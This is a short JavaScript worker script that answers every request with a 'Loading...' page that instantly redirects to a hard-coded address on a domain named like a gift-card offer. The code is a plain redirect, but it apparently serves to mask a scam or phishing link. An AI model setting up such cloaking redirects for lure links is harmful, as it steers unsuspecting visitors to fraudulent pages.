addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  let url = "http://freely.giftchecking.com/mamun3h"; // Change this to your URL
  return new Response(
    `<!DOCTYPE html>
      <html>
      <head>
        <title>Loading...</title>
        <meta http-equiv="refresh" content="0;url=${url}">
      </head>
      <body>
        <p>Redirecting... Please wait...</p>
      </body>
      </html>`,
    { headers: { "Content-Type": "text/html" } }
  )
}

